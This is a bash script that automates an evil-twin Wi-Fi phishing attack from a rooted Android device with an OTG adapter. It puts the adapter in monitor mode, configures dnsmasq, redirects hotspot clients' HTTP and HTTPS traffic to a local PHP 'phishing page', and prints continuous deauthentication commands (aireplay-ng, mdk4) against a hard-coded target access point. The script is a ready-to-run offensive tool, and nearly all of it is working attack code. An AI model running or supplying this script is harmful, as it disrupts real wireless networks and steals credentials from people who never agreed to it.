#!/bin/bash

hotspot=wlan1
adapter=wlan2
target="50:04:b8:7f:bd:1c"
channel=7
ip_hotspot=$(ip -4 addr show $hotspot | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

yelo="\e[1;33m"
cyn="\e[96m"
nc="\e[0m"

while getopts "t:c:" opt; do
    case $opt in
        t) target="$OPTARG" ;;
        c) channel="$OPTARG" ;;
        *) echo "Usage: $0 -t <target> -c <channel>" && exit 1 ;;
    esac
done

#step0
function downgrade_iptables() {
    wget http://old.kali.org/kali/pool/main/i/iptables/iptables_1.6.2-1.1_arm64.deb 
    wget http://old.kali.org/kali/pool/main/i/iptables/libip4tc0_1.6.2-1.1_arm64.deb 
    wget http://old.kali.org/kali/pool/main/i/iptables/libip6tc0_1.6.2-1.1_arm64.deb 
    wget http://old.kali.org/kali/pool/main/i/iptables/libiptc0_1.6.2-1.1_arm64.deb 
    wget http://old.kali.org/kali/pool/main/i/iptables/libxtables12_1.6.2-1.1_arm64.deb 
    dpkg -i *.deb 
    apt-mark hold iptables libip4tc0 libip6tc0 libiptc0 libxtables12 
}

current_version=$(dpkg -s iptables | grep Version | awk '{print $2}')
target_version="1.6.2-1.1"

if [[ "$current_version" == "$target_version" ]]; then
    echo "Current iptables version is $current_version, skipping downgrade."
else
    downgrade_iptables
fi

function install_packages() {
    packages=("php" "aircrack-ng")
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "$package"; then
            echo "$package is not installed. Installing..."
            apt-get install -y "$package"
        else
            echo "$package is already installed."
        fi
    done
}
install_packages
clear
echo "________________________"
echo 
echo "[✓] Target: $target"
echo "[✓] Channel: $channel"
echo "________________________"

loopF() {
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep "0.02"
    done
}

# step1

echo -e "[1]${cyn} Enable Wifi or Data and Hotspot ${nc}"
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read
echo -e "[2]${cyn} Connect your adapter via OTG ${nc}"
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read
echo -e "[3]${cyn} (copy & paste) to Load adapter from android su ${nc}"
echo '    su -c "insmod /system/lib/modules/8188eu.ko"'
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read

#step2
echo -e "[4]${cyn} Putting ${adapter} in monitor mode ${nc}"
if airmon-ng start $adapter > /dev/null 2>&1; then
    echo "[✓] success."
else
    echo "[!] Failed."
fi
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read

#step3
echo -e "[5]${cyn} running dnsmasq service.${nc}"
{
    cat <<EOL > /etc/dnsmasq.conf
domain-needed
bogus-priv
listen-address=127.0.0.1
port=5353
server=$ip_address
interface=$hotspot
EOL

    service dnsmasq restart
} > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "[✓] success."
else
    echo "[!] Failed! "
fi
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read
#step4
echo -e "[6]${cyn} configure iptables with phishing page.${nc}"
{
    iptables -F
    iptables --policy INPUT ACCEPT
    iptables --policy FORWARD ACCEPT
    iptables --policy OUTPUT ACCEPT
    iptables -t nat -A PREROUTING -i $hotspot -p tcp --dport 80 -j DNAT --to-destination $ip_hotspot:80
    iptables -t nat -A PREROUTING -i $hotspot -p tcp --dport 443 -j DNAT --to-destination $ip_hotspot:80
} > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "[✓] success."
else
    echo "[!] Failed."
fi
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read

#step5
echo -e "[7]${cyn} Starting PHP server on port 80...${nc}"
cd server && php -S 0.0.0.0:80 > /dev/null 2>&1 &

if [ $? -eq 0 ]; then
    echo "[✓] success."
else
    echo "[!] Failed."
    exit 1
fi
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read

#step7
echo -e "[8]${cyn} (copy & paste) to Monitoring connected devices ${nc}"
echo "    airodump-ng $adapter -a $target -c $channel"
echo -e "[*]${yelo} Press Enter to continue:${nc}"
read

#step6
echo -e "[9]${cyn} (copy & paste) to run deauthentication attack ${nc}"
iwconfig $adapter channel $channel > /dev/null 2>&1
echo "    aireplay-ng -0 0 -a $target $adapter  "
echo "                     OR              "
echo "    mdk4 $adapter d -c $channel -B $target"
echo " "
echo -e "[!]${yelo} Press CTRL+C to STOP Me:${nc}"
#function_clean
cleanup() {
    iptables -F
    iptables --policy INPUT ACCEPT
    iptables --policy FORWARD ACCEPT
    iptables --policy OUTPUT ACCEPT
    service dnsmasq stop
    pkill -f "php -S 0.0.0.0:80"
}
#function_reset
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
}

#function_goodbye
goodbye () {
    echo -e "${red} "
    text="thanks & goodbye."
    loopF
    echo -e "${nc} "
    reset_color
    cleanup
    exit
}
trap goodbye INT
while true; do
    sleep 1
done